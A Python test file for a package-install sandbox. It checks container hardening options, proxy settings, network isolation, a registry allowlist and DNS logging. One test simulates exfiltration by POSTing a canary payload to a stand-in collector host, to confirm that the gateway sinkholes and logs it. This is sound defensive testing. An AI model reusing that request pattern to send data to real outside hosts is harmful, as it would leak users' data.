"""Tests for sandbox container hardening configuration."""

from safeinstall.config import SandboxLimits, gateway_environment, sandbox_container_kwargs
from safeinstall.orchestrator import NetworkTopology
from safeinstall.gateway.proxy import DEFAULT_REGISTRY_ALLOWLIST, GatewayProxy, serve_proxy
import json
import tempfile
from pathlib import Path
from threading import Thread
from urllib.request import build_opener, ProxyHandler, Request
from safeinstall.gateway.dns_server import DNSLogger, dns_response, parse_question
import socket
import time


def test_hardened_sandbox_options() -> None:
    kwargs = sandbox_container_kwargs("safeinstall-sandbox:test")

    assert kwargs["read_only"] is True
    assert kwargs["tmpfs"] == {
        "/work": "rw,nosuid,nodev,size=1g",
        "/tmp": "rw,nosuid,nodev,size=512m",
        "/home/sandbox": "rw,nosuid,nodev,uid=1000,gid=1000,mode=0700,size=64m",
    }
    assert kwargs["cap_drop"] == ["ALL"]
    assert kwargs["security_opt"] == ["no-new-privileges:true"]
    assert kwargs["mem_limit"] == 1 * 1024 * 1024 * 1024
    assert kwargs["nano_cpus"] == 1_000_000_000
    assert kwargs["pids_limit"] == 256


def test_hardened_sandbox_custom_limits() -> None:
    limits = SandboxLimits(
        memory_bytes=512 * 1024 * 1024,
        nano_cpus=500_000_000,
        pids_limit=64,
    )

    kwargs = sandbox_container_kwargs("safeinstall-sandbox:test", limits)

    assert kwargs["mem_limit"] == 512 * 1024 * 1024
    assert kwargs["nano_cpus"] == 500_000_000
    assert kwargs["pids_limit"] == 64


def test_gateway_environment_contract() -> None:
    environment = gateway_environment("http://safeinstall-gateway:3128")

    assert environment["HTTP_PROXY"] == "http://safeinstall-gateway:3128"
    assert environment["HTTPS_PROXY"] == "http://safeinstall-gateway:3128"
    assert environment["PIP_INDEX_URL"] == "https://pypi.org/simple"
    assert environment["NPM_CONFIG_REGISTRY"] == "https://registry.npmjs.org/"


def test_network_topology_isolates_sandbox() -> None:
    topology = NetworkTopology(
        internal_name="safeinstall-run-001",
        gateway_name="safeinstall-gateway-001",
        sandbox_name="safeinstall-sandbox-001",
    )

    topology.validate()
    assert topology.sandbox_networks() == ("safeinstall-run-001",)
    assert topology.gateway_networks() == ("bridge", "safeinstall-run-001")


def test_registry_allowlist_defaults() -> None:
    with tempfile.TemporaryDirectory() as directory:
        gateway = GatewayProxy(Path(directory) / "gateway.jsonl")

        assert gateway.allowed("pypi.org")
        assert gateway.allowed("files.pythonhosted.org")
        assert gateway.allowed("registry.npmjs.org")
        assert not gateway.allowed("collector.example")

        gateway.log({"type": "http_request", "host": "pypi.org"})
        records = [
            json.loads(line)
            for line in (Path(directory) / "gateway.jsonl").read_text().splitlines()
        ]
        assert records[0]["host"] == "pypi.org"


def test_proxy_serves_unknown_host_as_sinkhole() -> None:
    with tempfile.TemporaryDirectory() as directory:
        server = serve_proxy(
            "127.0.0.1",
            0,
            Path(directory) / "gateway.jsonl",
            ["example.com"],
        )
        thread = Thread(target=server.serve_forever, daemon=True)
        thread.start()
        port = server.server_address[1]

        try:
            opener = build_opener(ProxyHandler({
                "http": f"http://127.0.0.1:{port}",
            }))
            response = opener.open(
                Request("http://collector.example/upload", data=b"canary", method="POST"),
                timeout=3,
            )
            assert response.status == 200
            assert response.headers["X-SafeInstall-Sinkhole"] == "1"
            assert b"request recorded" in response.read()
        finally:
            server.shutdown()
            server.server_close()


def test_dns_server_logs_udp_query(tmp_path) -> None:
    log_path = tmp_path / "gateway.jsonl"
    logger = DNSLogger(log_path, "127.0.0.1", 0)
    logger.start()
    assert logger._socket is not None
    port = logger._socket.getsockname()[1]

    query_name = b"\x09collector\x07example\x00"
    query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + query_name + b"\x00\x01\x00\x01"
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.settimeout(2)
    client.sendto(query, ("127.0.0.1", port))
    response = client.recvfrom(4096)
    client.close()

    time.sleep(0.1)
    logger.stop()
    records = [
        json.loads(line)
        for line in log_path.read_text().splitlines()
    ]
    assert len(records) == 1
    assert records[0]["type"] == "dns"
    assert records[0]["host"] == "collector.example"
    assert response[0][:2] == b"\x12\x34"
